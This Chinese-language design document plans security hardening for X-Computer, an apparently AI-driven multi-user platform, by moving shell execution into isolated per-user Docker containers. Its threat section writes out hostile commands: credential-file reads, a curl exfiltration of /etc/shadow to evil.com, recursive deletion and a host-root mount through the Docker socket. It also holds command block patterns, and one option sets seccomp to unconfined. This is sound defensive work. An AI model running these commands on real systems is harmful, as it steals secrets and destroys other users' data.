# X-Computer 安全加固方案

**创建时间**: 2026-02-28  
**优先级**: 🚨 **P0 - 阻塞上线**  
**状态**: 待开发

---

## 🚨 当前安全风险

### 严重风险（P0 - 必须修复才能上线）

#### 1. Shell 命令执行风险
**当前实现**: `SandboxShell` 直接在宿主机执行命令

```typescript
// 当前代码 (server/src/tooling/SandboxShell.ts:67)
const child = exec(command, {
  cwd: workDir,  // 虽然限制了 cwd，但命令本身可以突破
  timeout: timeoutMs,
  env: { ...process.env }  // 继承了宿主机环境变量！
});
```

**攻击场景**:
```typescript
// 用户可以通过 AI 执行以下命令
shell.run("cat /etc/passwd")              // 读取宿主机敏感文件
shell.run("ls /home")                     // 列出所有用户目录
shell.run("cd / && find . -name '*.env'") // 查找所有环境变量文件
shell.run("curl http://evil.com -d @/etc/shadow") // 泄露数据
shell.run("rm -rf ../../../")             // 删除其他用户文件
shell.run("ps aux")                       // 查看所有进程（包括其他用户）
```

#### 2. Docker 访问风险
**当前实现**: `DockerShellSession` 直接访问宿主机 Docker Socket

```typescript
// 当前代码 (server/src/docker/DockerShellSession.ts:48)
this.docker = new Docker({ socketPath: '/var/run/docker.sock' });
```

**攻击场景**:
```typescript
// 用户可以通过 AI 执行
docker.list()                              // 看到所有用户的容器
docker.run("alpine", "cat /host/etc/passwd", {
  volumes: ["/:/host"]                     // 挂载宿主机根目录
})
docker.exec(otherUserContainer, "rm -rf /") // 破坏其他用户容器
```

#### 3. 文件系统隔离不足
**当前实现**: 虽然有 `workspaceRoot` 限制，但 shell 命令可以突破

```typescript
// 路径检查只在 resolvePath 中，但 shell 命令不经过这个检查
shell.run("cat ../../../other-user/workspace/secret.txt")
```

#### 4. 环境变量泄露
```typescript
// 当前代码继承了宿主机所有环境变量
env: { ...process.env }

// 可能包含敏感信息
process.env.STRIPE_SECRET_KEY
process.env.DATABASE_PASSWORD
process.env.OPENAI_API_KEY
```

---

## ✅ 解决方案

### 方案 A: Docker 容器隔离（推荐 ⭐）

#### 架构设计
```
┌─────────────────────────────────────────────┐
│           宿主机 (Host Machine)              │
│                                             │
│  ┌─────────────────────────────────────┐   │
│  │   X-Computer Server (Node.js)       │   │
│  │   - API 服务                         │   │
│  │   - 任务编排                         │   │
│  │   - 用户管理                         │   │
│  └─────────────────────────────────────┘   │
│                    │                        │
│                    │ Docker API             │
│                    ▼                        │
│  ┌─────────────────────────────────────┐   │
│  │  User Container 1 (user-123)        │   │
│  │  - 独立文件系统                      │   │
│  │  - 资源限制 (CPU/Memory)            │   │
│  │  - 网络隔离                          │   │
│  │  - 无 Docker Socket                  │   │
│  └─────────────────────────────────────┘   │
│                                             │
│  ┌─────────────────────────────────────┐   │
│  │  User Container 2 (user-456)        │   │
│  │  - 完全隔离                          │   │
│  └─────────────────────────────────────┘   │
└─────────────────────────────────────────────┘
```

#### 实现步骤

##### 1. 创建用户容器管理器

```typescript
// server/src/container/UserContainerManager.ts
import Docker from 'dockerode';
import path from 'path';

export interface ContainerConfig {
  userId: string;
  cpuLimit?: number;      // CPU 核心数限制
  memoryLimit?: string;   // 内存限制 (e.g., "512m")
  storageLimit?: string;  // 存储限制 (e.g., "1g")
  networkMode?: string;   // 网络模式 (默认 "none")
}

export class UserContainerManager {
  private docker: Docker;
  private containers: Map<string, string> = new Map(); // userId -> containerId
  private workspaceBasePath: string;

  constructor(workspaceBasePath: string) {
    this.docker = new Docker({ socketPath: '/var/run/docker.sock' });
    this.workspaceBasePath = workspaceBasePath;
  }

  /**
   * 为用户创建或获取容器
   */
  async getOrCreateContainer(config: ContainerConfig): Promise<string> {
    const { userId } = config;
    
    // 检查是否已有容器
    if (this.containers.has(userId)) {
      const containerId = this.containers.get(userId)!;
      const container = this.docker.getContainer(containerId);
      
      try {
        const info = await container.inspect();
        if (info.State.Running) {
          return containerId;
        }
      } catch (error) {
        // 容器不存在，需要重新创建
        this.containers.delete(userId);
      }
    }

    // 创建新容器
    return await this.createContainer(config);
  }

  /**
   * 创建用户容器
   */
  private async createContainer(config: ContainerConfig): Promise<string> {
    const { userId, cpuLimit = 1, memoryLimit = '512m', networkMode = 'none' } = config;
    
    const workspacePath = path.join(this.workspaceBasePath, 'users', userId, 'workspace');
    
    const container = await this.docker.createContainer({
      name: `x-computer-user-${userId}`,
      Image: 'x-computer-sandbox:latest', // 自定义镜像
      
      // 资源限制
      HostConfig: {
        Memory: this.parseMemoryLimit(memoryLimit),
        NanoCpus: cpuLimit * 1e9,
        
        // 挂载用户工作区（只读宿主机，读写容器内）
        Binds: [
          `${workspacePath}:/workspace:rw`
        ],
        
        // 网络隔离（默认无网络，需要时可配置受限网络）
        NetworkMode: networkMode,
        
        // 禁止访问 Docker Socket
        // 不挂载 /var/run/docker.sock
        
        // 禁止特权模式
        Privileged: false,
        
        // 只读根文件系统（除了 /workspace 和 /tmp）
        ReadonlyRootfs: true,
        
        // 临时文件系统
        Tmpfs: {
          '/tmp': 'rw,noexec,nosuid,size=100m'
        },
        
        // 资源限制
        PidsLimit: 100, // 最多 100 个进程
        
        // 安全选项
        SecurityOpt: [
          'no-new-privileges', // 禁止提升权限
          'seccomp=unconfined' // 可选：使用自定义 seccomp profile
        ],
        
        // 禁用容器内的设备访问
        DeviceRequests: [],
      },
      
      // 环境变量（只提供必要的）
      Env: [
        'HOME=/workspace',
        'USER=x-user',
        'TERM=xterm-256color',
        'LANG=en_US.UTF-8',
        'PATH=/usr/local/bin:/usr/bin:/bin',
        // 不传递任何敏感环境变量
      ],
      
      // 工作目录
      WorkingDir: '/workspace',
      
      // 用户（非 root）
      User: '1000:1000', // 使用非特权用户
      
      // 自动删除（可选）
      // HostConfig: { AutoRemove: true },
    });

    await container.start();
    
    const containerId = container.id;
    this.containers.set(userId, containerId);
    
    return containerId;
  }

  /**
   * 在用户容器中执行命令
   */
  async execInContainer(
    userId: string,
    command: string,
    options: {
      cwd?: string;
      timeout?: number;
    } = {}
  ): Promise<{ stdout: string; stderr: string; exitCode: number }> {
    const containerId = await this.getOrCreateContainer({ userId });
    const container = this.docker.getContainer(containerId);
    
    const { cwd = '/workspace', timeout = 30000 } = options;
    
    // 创建 exec 实例
    const exec = await container.exec({
      Cmd: ['/bin/sh', '-c', `cd ${cwd} && ${command}`],
      AttachStdout: true,
      AttachStderr: true,
      Tty: false,
    });

    // 执行命令
    const stream = await exec.start({ Detach: false });
    
    let stdout = '';
    let stderr = '';
    
    return new Promise((resolve, reject) => {
      const timeoutId = setTimeout(() => {
        stream.destroy();
        reject(new Error('命令执行超时'));
      }, timeout);

      stream.on('data', (chunk: Buffer) => {
        const str = chunk.toString();
        // Docker stream format: 8-byte header + payload
        if (chunk[0] === 1) { // stdout
          stdout += str.slice(8);
        } else if (chunk[0] === 2) { // stderr
          stderr += str.slice(8);
        }
      });

      stream.on('end', async () => {
        clearTimeout(timeoutId);
        
        const info = await exec.inspect();
        resolve({
          stdout: stdout.slice(0, 50000),
          stderr: stderr.slice(0, 10000),
          exitCode: info.ExitCode ?? 0,
        });
      });

      stream.on('error', (error) => {
        clearTimeout(timeoutId);
        reject(error);
      });
    });
  }

  /**
   * 停止并删除用户容器
   */
  async removeContainer(userId: string): Promise<void> {
    const containerId = this.containers.get(userId);
    if (!containerId) return;

    try {
      const container = this.docker.getContainer(containerId);
      await container.stop({ t: 10 });
      await container.remove();
      this.containers.delete(userId);
    } catch (error) {
      console.error(`Failed to remove container for user ${userId}:`, error);
    }
  }

  /**
   * 清理所有容器
   */
  async cleanup(): Promise<void> {
    const promises = Array.from(this.containers.keys()).map(userId =>
      this.removeContainer(userId)
    );
    await Promise.all(promises);
  }

  private parseMemoryLimit(limit: string): number {
    const match = limit.match(/^(\d+)([kmg]?)$/i);
    if (!match) throw new Error(`Invalid memory limit: ${limit}`);
    
    const value = parseInt(match[1]);
    const unit = match[2].toLowerCase();
    
    switch (unit) {
      case 'k': return value * 1024;
      case 'm': return value * 1024 * 1024;
      case 'g': return value * 1024 * 1024 * 1024;
      default: return value;
    }
  }
}
```

##### 2. 创建沙箱镜像

```dockerfile
# docker/sandbox.Dockerfile
FROM node:20-alpine

# 安装必要工具
RUN apk add --no-cache \
    python3 \
    py3-pip \
    git \
    curl \
    bash \
    && rm -rf /var/cache/apk/*

# 创建非特权用户
RUN addgroup -g 1000 xuser && \
    adduser -D -u 1000 -G xuser xuser

# 创建工作目录
RUN mkdir -p /workspace && \
    chown -R xuser:xuser /workspace

# 切换到非特权用户
USER xuser

WORKDIR /workspace

# 默认命令
CMD ["/bin/sh"]
```

构建镜像:
```bash
docker build -f docker/sandbox.Dockerfile -t x-computer-sandbox:latest .
```

##### 3. 更新 SandboxShell 使用容器

```typescript
// server/src/tooling/SandboxShell.ts
import { UserContainerManager } from '../container/UserContainerManager.js';

export class SandboxShell {
  private containerManager: UserContainerManager;
  private userId: string;
  private timeout: number;

  constructor(
    userId: string,
    containerManager: UserContainerManager,
    timeoutMs = 30_000
  ) {
    this.userId = userId;
    this.containerManager = containerManager;
    this.timeout = timeoutMs;
  }

  async execute(
    command: string,
    cwd?: string,
    timeoutOverrideMs?: number
  ): Promise<ShellResult> {
    const startTime = Date.now();

    // 安全检查（保留基本检查）
    this.validateCommand(command);

    try {
      const result = await this.containerManager.execInContainer(
        this.userId,
        command,
        {
          cwd: cwd || '/workspace',
          timeout: timeoutOverrideMs ?? this.timeout,
        }
      );

      return {
        ...result,
        command,
        duration: Date.now() - startTime,
      };
    } catch (error) {
      return {
        stdout: '',
        stderr: error instanceof Error ? error.message : String(error),
        exitCode: 1,
        command,
        duration: Date.now() - startTime,
      };
    }
  }

  private validateCommand(command: string) {
    // 基本安全检查（容器已提供主要隔离）
    const BLOCKED_PATTERNS = [
      /sudo/i,
      /su\s/i,
      /passwd/i,
    ];

    for (const pattern of BLOCKED_PATTERNS) {
      if (pattern.test(command)) {
        throw new Error(`命令被安全策略拦截: ${command}`);
      }
    }
  }
}
```

##### 4. 更新 Docker 工具限制

```typescript
// server/src/docker/DockerToolExecutor.ts
export class DockerToolExecutor {
  async execute(userId: string, action: string, params: any) {
    // 禁止用户直接访问 Docker
    throw new Error(
      'Docker 工具已禁用。请使用 shell.run 在您的沙箱环境中执行命令。'
    );
  }
}
```

---

### 方案 B: 加强沙箱限制（临时方案）

如果无法立即实施 Docker 容器隔离，可以先加强现有沙箱的限制：

#### 1. 严格的命令白名单

```typescript
// server/src/tooling/SandboxShell.ts
const ALLOWED_COMMANDS = new Set([
  // 只允许安全的读取命令
  'ls', 'cat', 'head', 'tail', 'wc', 'echo', 'pwd',
  'find', 'grep', 'sort', 'uniq',
  
  // 允许的编程语言（在沙箱内）
  'node', 'python3',
  
  // 禁止所有其他命令
]);

private validateCommand(command: string) {
  const firstWord = command.trim().split(/\s+/)[0];
  
  if (!ALLOWED_COMMANDS.has(firstWord)) {
    throw new Error(`命令未授权: ${firstWord}`);
  }
  
  // 检查危险模式
  const BLOCKED_PATTERNS = [
    /\.\./,                    // 禁止 ..
    /\//,                      // 禁止绝对路径
    /\$/,                      // 禁止变量替换
    /`/,                       // 禁止命令替换
    /\|/,                      // 禁止管道
    /;/,                       // 禁止命令链
    /&&/,                      // 禁止命令链
    />/,                       // 禁止重定向
    /</,                       // 禁止重定向
  ];
  
  for (const pattern of BLOCKED_PATTERNS) {
    if (pattern.test(command)) {
      throw new Error(`命令包含不安全字符: ${command}`);
    }
  }
}
```

#### 2. 禁用 Docker 工具

```typescript
// server/src/orchestrator/ToolExecutor.ts
case 'docker.run':
case 'docker.exec':
case 'docker.list':
  throw new Error('Docker 工具已禁用，等待容器隔离方案实施');
```

#### 3. 环境变量清理

```typescript
// server/src/tooling/SandboxShell.ts
const child = exec(command, {
  cwd: workDir,
  timeout: timeoutMs,
  env: {
    // 只提供必要的环境变量
    HOME: this.workspaceRoot,
    USER: 'x-computer',
    TERM: 'xterm-256color',
    PATH: '/usr/local/bin:/usr/bin:/bin',
    // 不传递 process.env
  },
});
```

---

## 📋 实施计划

### 阶段 1: 紧急修复（1-2 天）⚠️
- [ ] **禁用 Docker 工具**
- [ ] **清理环境变量泄露**
- [ ] **加强命令白名单**
- [ ] **添加用户操作审计日志**

### 阶段 2: 容器隔离（1 周）🔒
- [ ] **创建 UserContainerManager**
- [ ] **构建沙箱镜像**
- [ ] **更新 SandboxShell 使用容器**
- [ ] **测试容器隔离**
- [ ] **性能优化（容器池）**

### 阶段 3: 全面加固（2 周）🛡️
- [ ] **网络隔离与白名单**
- [ ] **资源配额管理**
- [ ] **安全审计与监控**
- [ ] **渗透测试**

---

## 🔍 安全检查清单

### 上线前必须完成
- [ ] ✅ 所有 shell 命令在隔离容器中执行
- [ ] ✅ 用户无法访问宿主机 Docker
- [ ] ✅ 用户无法访问其他用户文件
- [ ] ✅ 敏感环境变量不泄露
- [ ] ✅ 资源限制（CPU/内存/存储）
- [ ] ✅ 网络访问受限
- [ ] ✅ 所有操作有审计日志

### 推荐完成
- [ ] 🔒 容器自动清理（闲置 N 分钟）
- [ ] 🔒 DDoS 防护
- [ ] 🔒 Rate Limiting
- [ ] 🔒 入侵检测
- [ ] 🔒 定期安全扫描

---

## 📊 性能影响评估

### 容器方案性能开销
- **容器创建**: ~2-5 秒（首次）
- **容器复用**: ~50-100ms（后续）
- **命令执行**: +10-20ms（vs 直接 exec）
- **内存开销**: ~50-100MB/容器

### 优化策略
1. **容器池**: 预创建容器，减少启动延迟
2. **容器复用**: 同一用户会话复用容器
3. **自动清理**: 闲置 30 分钟后自动停止
4. **资源限制**: 防止单用户占用过多资源

---

## 🎯 推荐方案

**立即实施**: 方案 B（加强沙箱限制）+ 禁用 Docker 工具  
**短期目标**: 方案 A（Docker 容器隔离）  
**长期目标**: 全面安全加固 + 持续监控

---

## 📚 相关文档

- [多用户架构](./INFRASTRUCTURE_MULTIUSER_CLOUD.md)
- [订阅系统](./R057_SUBSCRIPTION_IMPLEMENTATION.md)
- [需求管理](./REQUIREMENTS.md)

---

**安全是上线的前提！** 🔒
